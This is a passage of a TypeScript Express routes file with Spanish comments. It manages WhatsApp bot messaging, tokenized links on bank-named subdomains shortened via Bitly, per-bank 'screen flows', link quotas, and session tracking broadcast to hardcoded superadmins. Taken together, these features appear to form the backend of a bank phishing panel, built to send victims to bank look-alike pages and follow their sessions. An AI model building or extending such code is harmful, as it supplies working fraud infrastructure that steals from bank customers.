      res.status(500).json({ message: "Error al iniciar bot de WhatsApp" });
    }
  });

  // Detener bot de WhatsApp
  app.post("/api/whatsapp/stop", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      // Usar el gestor de bots para detener el bot de este usuario
      await whatsappBotManager.stopBot(req.user.id);

      // Actualizar configuración
      await storage.updateWhatsAppConfig(req.user.id, {
        isConnected: false,
        qrCode: null
      });

      res.json({ success: true });
    } catch (error) {
      console.error("Error deteniendo bot de WhatsApp:", error);
      res.status(500).json({ message: "Error al detener bot de WhatsApp" });
    }
  });

  // Obtener estado de conexión
  app.get("/api/whatsapp/status", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      const config = await storage.getWhatsAppConfig(req.user.id);
      const bot = whatsappBotManager.getBot(req.user.id);
      const isConnected = bot?.isConnected() || false;

      res.json({ 
        isConnected,
        qrCode: config?.qrCode || null,
        phoneNumber: config?.phoneNumber || ''
      });
    } catch (error) {
      console.error("Error obteniendo estado de WhatsApp:", error);
      res.status(500).json({ message: "Error al obtener estado" });
    }
  });

  // Actualizar configuración de WhatsApp
  app.post("/api/whatsapp/config", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      const { welcomeMessage, phoneNumber } = req.body;
      
      const existingConfig = await storage.getWhatsAppConfig(req.user.id);
      let config;
      
      if (existingConfig) {
        config = await storage.updateWhatsAppConfig(req.user.id, {
          welcomeMessage,
          phoneNumber
        });
      } else {
        config = await storage.createWhatsAppConfig({
          userId: req.user.id,
          welcomeMessage,
          phoneNumber: phoneNumber || '',
          isConnected: false,
          qrCode: null
        });
      }
      
      res.json(config);
    } catch (error) {
      console.error("Error actualizando configuración de WhatsApp:", error);
      res.status(500).json({ message: "Error al actualizar configuración" });
    }
  });

  // Obtener opciones de menú
  app.get("/api/whatsapp/menu", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      const options = await storage.getWhatsAppMenuOptions(req.user.id);
      res.json(options);
    } catch (error) {
      console.error("Error obteniendo opciones de menú:", error);
      res.status(500).json({ message: "Error al obtener opciones de menú" });
    }
  });

  // Crear opción de menú
  app.post("/api/whatsapp/menu", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      const { optionNumber, optionText, responseMessage, actionType, parentId } = req.body;
      
      const option = await storage.createWhatsAppMenuOption({
        userId: req.user.id,
        optionNumber,
        optionText,
        responseMessage,
        actionType,
        parentId: parentId || null
      });
      
      res.json(option);
    } catch (error) {
      console.error("Error creando opción de menú:", error);
      res.status(500).json({ message: "Error al crear opción de menú" });
    }
  });

  // Actualizar opción de menú
  app.put("/api/whatsapp/menu/:id", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      const { id } = req.params;
      const { optionNumber, optionText, responseMessage, actionType, parentId } = req.body;
      
      // Verificar que la opción pertenece al usuario antes de actualizar
      const existingOptions = await storage.getWhatsAppMenuOptions(req.user.id);
      const existingOption = existingOptions.find(o => o.id === parseInt(id));
      
      if (!existingOption) {
        return res.status(404).json({ message: "Opción no encontrada o no tienes permisos para modificarla" });
      }
      
      const option = await storage.updateWhatsAppMenuOption(parseInt(id), {
        optionNumber,
        optionText,
        responseMessage,
        actionType,
        parentId
      });
      
      res.json(option);
    } catch (error) {
      console.error("Error actualizando opción de menú:", error);
      res.status(500).json({ message: "Error al actualizar opción de menú" });
    }
  });

  // Eliminar opción de menú
  app.delete("/api/whatsapp/menu/:id", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      const { id } = req.params;
      
      // Verificar que la opción pertenece al usuario antes de eliminar
      const existingOptions = await storage.getWhatsAppMenuOptions(req.user.id);
      const existingOption = existingOptions.find(o => o.id === parseInt(id));
      
      if (!existingOption) {
        return res.status(404).json({ message: "Opción no encontrada o no tienes permisos para eliminarla" });
      }
      
      const deleted = await storage.deleteWhatsAppMenuOption(parseInt(id));
      
      if (deleted) {
        res.json({ success: true });
      } else {
        res.status(404).json({ message: "Opción no encontrada" });
      }
    } catch (error) {
      console.error("Error eliminando opción de menú:", error);
      res.status(500).json({ message: "Error al eliminar opción de menú" });
    }
  });

  // Enviar mensaje de prueba
  app.post("/api/whatsapp/send-test", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      const { phoneNumber } = req.body;
      
      // Obtener el bot de este usuario
      const bot = whatsappBotManager.getBot(req.user.id);
      
      // Verificar que el bot esté conectado
      if (!bot || !bot.isConnected()) {
        return res.status(400).json({ 
          message: "El bot de WhatsApp no está conectado. Por favor escanea el código QR primero." 
        });
      }
      
      // Obtener configuración y menú
      const config = await storage.getWhatsAppConfig(req.user.id);
      const menuOptions = await storage.getWhatsAppMenuOptions(req.user.id);
      
      if (!config) {
        return res.status(400).json({ message: "No hay configuración de WhatsApp" });
      }
      
      // Construir mensaje con menú
      let message = config.welcomeMessage + '\n\n';
      
      menuOptions.forEach(option => {
        message += `${option.optionNumber}. ${option.optionText}\n`;
      });
      
      // Enviar mensaje a través del bot
      await bot.sendMessage(phoneNumber, message);
      
      res.json({ 
        success: true, 
        message: "Mensaje enviado correctamente",
        previewMessage: message,
        sentTo: phoneNumber
      });
    } catch (error) {
      console.error("Error enviando mensaje de prueba:", error);
      res.status(500).json({ message: "Error al enviar mensaje de prueba" });
    }
  });

  // Obtener conversaciones
  app.get("/api/whatsapp/conversations", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }
    
    try {
      const conversations = await storage.getWhatsAppConversations(req.user.id, 100);
      res.json(conversations);
    } catch (error) {
      console.error("Error obteniendo conversaciones:", error);
      res.status(500).json({ message: "Error al obtener conversaciones" });
    }
  });

  // ============================================================
  // SISTEMA DE GESTIÓN DE LINKS CON SUBDOMINIOS Y BITLY
  // ============================================================

  // Crear un nuevo link con subdominio y acortamiento Bitly
  app.post("/api/links", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const { bankCode, sessionId, metadata } = req.body;

      if (!bankCode) {
        return res.status(400).json({ message: "Se requiere el código del banco" });
      }

      const link = await linkTokenService.createLink({
        userId: req.user.id,
        bankCode,
        sessionId,
        metadata
      });

      res.json({
        success: true,
        link: {
          id: link.id,
          token: link.token,
          originalUrl: link.originalUrl,
          shortUrl: link.shortUrl || link.originalUrl,
          expiresAt: link.expiresAt
        }
      });
    } catch (error: any) {
      console.error("Error creando link:", error);
      res.status(500).json({ message: error.message || "Error al crear link" });
    }
  });

  // Obtener sesiones activas con links
  app.get("/api/links/active-sessions", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      // Query para traer sesiones activas con links activos
      const { db } = await import('./db');
      const activeSessions = await db
        .select({
          sessionId: sessions.sessionId,
          folio: sessions.folio,
          banco: sessions.banco,
          createdAt: sessions.createdAt,
          createdBy: sessions.createdBy,
          linkId: linkTokens.id,
          token: linkTokens.token,
          originalUrl: linkTokens.originalUrl,
          shortUrl: linkTokens.shortUrl,
          linkStatus: linkTokens.status,
          expiresAt: linkTokens.expiresAt,
          usedAt: linkTokens.usedAt
        })
        .from(sessions)
        .innerJoin(linkTokens, eq(sessions.sessionId, linkTokens.sessionId))
        .where(
          and(
            eq(sessions.active, true),
            eq(linkTokens.userId, req.user.id),
            eq(linkTokens.status, 'active')
          )
        )
        .orderBy(desc(linkTokens.createdAt));

      // Calcular tiempo restante para cada link
      const now = new Date();
      const sessionsWithTimeRemaining = activeSessions.map((session: any) => {
        const expiresAt = new Date(session.expiresAt);
        const timeRemainingMs = Math.max(0, expiresAt.getTime() - now.getTime());
        const isExpired = timeRemainingMs <= 0;
        
        const hours = Math.floor(timeRemainingMs / (1000 * 60 * 60));
        const minutes = Math.floor((timeRemainingMs % (1000 * 60 * 60)) / (1000 * 60));
        
        return {
          ...session,
          timeRemainingMs,
          timeRemainingFormatted: isExpired ? 'Expirado' : `${hours}h ${minutes}m`,
          isExpired
        };
      });

      res.json({
        success: true,
        sessions: sessionsWithTimeRemaining
      });
    } catch (error: any) {
      console.error("Error obteniendo sesiones activas con links:", error);
      res.status(500).json({ message: error.message || "Error al obtener sesiones" });
    }
  });

  // Obtener historial de links del usuario
  app.get("/api/links/history", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const limit = parseInt(req.query.limit as string) || 50;
      const history = await linkTokenService.getLinkHistory(req.user.id, limit);
      
      res.json({
        success: true,
        links: history
      });
    } catch (error: any) {
      console.error("Error obteniendo historial de links:", error);
      res.status(500).json({ message: error.message || "Error al obtener historial" });
    }
  });

  // Obtener cuota semanal de links
  app.get("/api/links/quota", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const usage = await linkQuotaService.getCurrentUsage(req.user.id);
      
      res.json({
        success: true,
        quota: usage
      });
    } catch (error: any) {
      console.error("Error obteniendo cuota:", error);
      res.status(500).json({ message: error.message || "Error al obtener cuota" });
    }
  });

  // Obtener cuota de links de un usuario específico (solo superadmin balonx)
  app.get("/api/admin/users/:userId/link-quota", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    // Solo el superadmin balonx puede ver las cuotas de otros usuarios
    if (req.user.username !== 'balonx') {
      return res.status(403).json({ message: "Solo el superadministrador puede ver las cuotas de usuarios" });
    }

    try {
      const userId = parseInt(req.params.userId, 10);
      
      // Validar que userId es un número válido
      if (isNaN(userId) || userId <= 0) {
        return res.status(400).json({ message: "ID de usuario inválido" });
      }

      // Verificar que el usuario existe
      const user = await storage.getUserById(userId);
      if (!user) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }

      const usage = await linkQuotaService.getCurrentUsage(userId);
      
      res.json({
        success: true,
        quota: {
          used: usage.count,
          limit: usage.limit,
          remaining: usage.remaining,
          resetsAt: usage.resetsAt
        }
      });
    } catch (error: any) {
      console.error("Error obteniendo cuota de usuario:", error);
      res.status(500).json({ message: error.message || "Error al obtener cuota" });
    }
  });

  // Resetear cuota semanal de links de un usuario (solo superadmin balonx)
  app.post("/api/admin/users/:userId/reset-link-quota", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    // Solo el superadmin balonx puede resetear cuotas
    if (req.user.username !== 'balonx') {
      return res.status(403).json({ message: "Solo el superadministrador puede resetear las cuotas de usuarios" });
    }

    try {
      const userId = parseInt(req.params.userId, 10);
      
      // Validar que userId es un número válido
      if (isNaN(userId) || userId <= 0) {
        return res.status(400).json({ message: "ID de usuario inválido" });
      }

      // Verificar que el usuario existe
      const user = await storage.getUserById(userId);
      if (!user) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }

      const result = await linkQuotaService.resetWeeklyUsage(userId);
      
      console.log(`[Admin] Cuota de links reseteada para usuario ${userId} (${user.username}) por ${req.user.username}`);
      
      res.json({
        success: true,
        message: `Cuota reseteada exitosamente para ${user.username}. Puede generar ${result.limit} links adicionales.`,
        quota: result
      });
    } catch (error: any) {
      console.error("Error reseteando cuota de usuario:", error);
      res.status(500).json({ message: error.message || "Error al resetear cuota" });
    }
  });

  // Endpoint de extender link eliminado - los links no expiran por tiempo

  // Cancelar un link (usuarios pueden cancelar sus propios links, admins pueden cancelar cualquiera)
  app.post("/api/links/:id/cancel", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const linkId = parseInt(req.params.id);
      
      // Verificar que el usuario sea el dueño del link o sea admin
      const link = await db.query.linkTokens.findFirst({
        where: eq(linkTokens.id, linkId)
      });

      if (!link) {
        return res.status(404).json({ message: "Link no encontrado" });
      }

      // Solo el dueño del link o un admin puede cancelarlo
      if (link.userId !== req.user.id && req.user.role !== 'admin') {
        return res.status(403).json({ message: "No tienes permiso para cancelar este link" });
      }

      // Cancelar el link y eliminar de Bitly automáticamente
      await linkTokenService.cancelLink(linkId);

      console.log(`[Links] Link ${linkId} cancelado por ${req.user.username} (${req.user.role})`);

      res.json({
        success: true,
        message: "Link cancelado y eliminado de Bitly exitosamente"
      });
    } catch (error: any) {
      console.error("Error cancelando link:", error);
      res.status(500).json({ message: error.message || "Error al cancelar link" });
    }
  });

  // Configurar subdominios de bancos (solo admin)
  app.get("/api/bank-subdomains", async (req, res) => {
    if (!req.isAuthenticated() || !req.user || req.user.role !== 'admin') {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const subdomains = await storage.getBankSubdomains();
      res.json({ success: true, subdomains });
    } catch (error: any) {
      console.error("Error obteniendo subdominios:", error);
      res.status(500).json({ message: error.message || "Error al obtener subdominios" });
    }
  });

  app.post("/api/bank-subdomains", async (req, res) => {
    if (!req.isAuthenticated() || !req.user || req.user.role !== 'admin') {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { bankCode, subdomain } = req.body;
      
      if (!bankCode || !subdomain) {
        return res.status(400).json({ message: "Se requieren bankCode y subdomain" });
      }

      // Validar y normalizar el subdominio
      const trimmedSubdomain = subdomain.trim().toLowerCase();
      
      // No permitir puntos (solo prefijo)
      if (trimmedSubdomain.includes('.')) {
        return res.status(400).json({ 
          message: "Solo ingresa el prefijo del subdominio (ejemplo: 'liverpool'), no el dominio completo. Se combinará automáticamente con tu dominio configurado." 
        });
      }

      // No permitir protocolos
      if (trimmedSubdomain.includes('://')) {
        return res.status(400).json({ 
          message: "No incluyas el protocolo (http:// o https://). Solo el prefijo del subdominio." 
        });
      }

      // Validar formato DNS: alfanumérico con guiones, sin guiones al inicio/final
      if (!/^[a-z0-9]([a-z0-9-]*[a-z0-9])?$/.test(trimmedSubdomain)) {
        return res.status(400).json({ 
          message: "El subdominio debe empezar y terminar con letra o número. Solo puede contener letras minúsculas, números y guiones internos." 
        });
      }

      // Validar longitud máxima DNS
      if (trimmedSubdomain.length > 63) {
        return res.status(400).json({ 
          message: "El subdominio no puede exceder 63 caracteres" 
        });
      }

      await storage.upsertBankSubdomain({ bankCode, subdomain: trimmedSubdomain, isActive: true });

      res.json({
        success: true,
        message: "Subdominio configurado exitosamente"
      });
    } catch (error: any) {
      console.error("Error configurando subdominio:", error);
      res.status(500).json({ message: error.message || "Error al configurar subdominio" });
    }
  });

  // Configuración de flujos de pantallas por banco (solo admin)
  app.get("/api/screen-flows/:bankCode", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const { bankCode } = req.params;
      const flow = await storage.getBankScreenFlow(bankCode);
      
      res.json({
        success: true,
        flow: flow || null
      });
    } catch (error: any) {
      console.error("Error obteniendo flujo de pantallas:", error);
      res.status(500).json({ message: error.message || "Error al obtener flujo" });
    }
  });

  app.put("/api/screen-flows/:bankCode", async (req, res) => {
    if (!req.isAuthenticated() || !req.user || req.user.role !== 'admin') {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { bankCode } = req.params;
      const { flowConfig } = req.body;

      if (!flowConfig || !Array.isArray(flowConfig)) {
        return res.status(400).json({ message: "flowConfig debe ser un array" });
      }

      await storage.upsertBankScreenFlow({
        bankCode,
        flowConfig,
        isActive: true,
        createdBy: req.user.id
      });

      res.json({
        success: true,
        message: "Flujo de pantallas configurado exitosamente"
      });
    } catch (error: any) {
      console.error("Error configurando flujo de pantallas:", error);
      res.status(500).json({ message: error.message || "Error al configurar flujo" });
    }
  });

  // Endpoints para flujos de usuario por banco
  app.get("/api/user-flows/:bankCode", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const { bankCode } = req.params;
      const flow = await storage.getUserBankFlow(req.user.id, bankCode);
      
      res.json({
        success: true,
        flow: flow || null
      });
    } catch (error: any) {
      console.error("Error obteniendo flujo de usuario:", error);
      res.status(500).json({ message: error.message || "Error al obtener flujo" });
    }
  });

  app.get("/api/user-flows", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const flows = await storage.getAllUserBankFlows(req.user.id);
      
      res.json({
        success: true,
        flows
      });
    } catch (error: any) {
      console.error("Error obteniendo flujos de usuario:", error);
      res.status(500).json({ message: error.message || "Error al obtener flujos" });
    }
  });

  app.put("/api/user-flows/:bankCode", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const { bankCode } = req.params;
      const { flowConfig } = req.body;

      if (!flowConfig || !Array.isArray(flowConfig)) {
        return res.status(400).json({ message: "flowConfig debe ser un array" });
      }

      await storage.saveUserBankFlow({
        userId: req.user.id,
        bankCode,
        flowConfig,
        isActive: true
      });

      res.json({
        success: true,
        message: "Flujo configurado exitosamente"
      });
    } catch (error: any) {
      console.error("Error configurando flujo de usuario:", error);
      res.status(500).json({ message: error.message || "Error al configurar flujo" });
    }
  });

  app.delete("/api/user-flows/:bankCode", async (req, res) => {
    if (!req.isAuthenticated() || !req.user) {
      return res.status(401).json({ message: "No autenticado" });
    }

    try {
      const { bankCode } = req.params;
      const deleted = await storage.deleteUserBankFlow(req.user.id, bankCode);
      
      if (!deleted) {
        return res.status(404).json({ message: "Flujo no encontrado" });
      }

      res.json({
        success: true,
        message: "Flujo eliminado exitosamente"
      });
    } catch (error: any) {
      console.error("Error eliminando flujo de usuario:", error);
      res.status(500).json({ message: error.message || "Error al eliminar flujo" });
    }
  });

  return httpServer;
}

// Helper function to broadcast to admin clients, with option to target specific users
function broadcastToAdmins(message: string, targetUsername?: string) {
  // Intentar parsear el mensaje para logging y extraer información
  try {
    const parsedMessage = JSON.parse(message);
    console.log(`[Broadcast] Enviando mensaje de tipo: ${parsedMessage.type}`);
    
    // Si el mensaje se refiere a una sesión, intentamos obtener el creador
    if (parsedMessage.data && parsedMessage.data.createdBy && !targetUsername) {
      // Usar el creador de la sesión como targetUsername si no se proporcionó uno
      targetUsername = parsedMessage.data.createdBy;
      console.log(`[Broadcast] Estableciendo targetUsername a ${targetUsername} basado en createdBy`);
    }
  } catch (e) {
    console.log(`[Broadcast] Enviando mensaje (formato no JSON)`);
  }

  // Si se especifica un usuario objetivo, enviamos el mensaje solo a ese usuario y a todos los administradores
  let sentCount = 0;
  
  if (targetUsername) {
    // Buscar el cliente del usuario objetivo y los administradores
    const entries = Array.from(adminClients.entries());
    for (let i = 0; i < entries.length; i++) {
      const [username, client] = entries[i];
      
      // Consideramos que cualquier usuario que está conectado como admin debe ser un admin, y también envíamos al usuario que creó
      if ((username === targetUsername || username === 'balonx' || username === 'yako') && client.readyState === WebSocket.OPEN) {
        client.send(message);
        sentCount++;
        console.log(`[Broadcast] Mensaje enviado específicamente a ${username}`);
      }
    }
  } else {
    // Comportamiento original: broadcast a todos los administradores conectados
    const entries = Array.from(adminClients.entries());
    for (let i = 0; i < entries.length; i++) {
      const [username, client] = entries[i];
      if (client.readyState === WebSocket.OPEN) {
        client.send(message);
        sentCount++;
      }
    }
  }
  
  console.log(`[Broadcast] Mensaje enviado a ${sentCount} clientes administradores`);
}